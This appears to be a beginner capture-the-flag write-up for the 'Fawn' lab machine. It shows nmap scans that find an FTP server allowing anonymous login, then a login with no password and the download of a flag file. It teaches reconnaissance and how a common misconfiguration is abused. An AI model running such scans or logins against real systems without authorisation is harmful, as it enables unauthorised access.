---
OS: Linux
Level: Very Easy
Skills: FTP
tags: [linux, ftp]
---
# 🦌 Fawn
<div class="machine-properties">
  <span class="prop-badge linux">Linux</span> <span class="prop-badge very-easy">Very Easy</span> <span class="prop-badge skills">FTP</span>
</div>


Fawn is a **Very Easy** Linux box that demonstrates how a misconfigured FTP server allowing anonymous access can lead to a full compromise.

---

## Recon

A full port scan reveals a single open port:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.21.178

PORT   STATE SERVICE
21/tcp open  ftp
```

A service scan identifies **vsftpd 3.0.3** with anonymous login enabled:

```
$ nmap -sCV -p21 10.129.21.178

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Key findings:
- **vsftpd 3.0.3** — a stable, fast FTP server
- **Anonymous login** — no credentials required
- **`flag.txt`** — visible directly from the root directory

---

## Foothold

Connect as the `anonymous` user (no password needed):

```
$ ftp 10.129.21.178
Connected to 10.129.21.178.
220 (vsFTPd 3.0.3)
Name (10.129.21.178:edu): anonymous
331 Please specify the password.
Password:                    <-- just press Enter
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

List and grab the flag:

```
ftp> passive
Passive mode on.

ftp> ls
227 Entering Passive Mode (10,129,21,178,173,156).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> get flag.txt
227 Entering Passive Mode (10,129,21,178,147,236).
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.0100 seconds (3.1264 kbytes/s)

ftp> quit
221 Goodbye.
```

The flag is now saved locally as `flag.txt`.

---

## Key Takeaways

- **Anonymous FTP** is a classic misconfiguration — always check if `ftp-anon` is enabled
- **vsftpd** reports its version via nmap, making version-based exploit identification easy
- A single open port was all it took — minimal attack surface, maximum impact

## 🔗 Related

- [[🗃️ FTP]] — FTP protocol guide
- [[🐊 Crocodile]] — Another machine using anonymous FTP + credential reuse
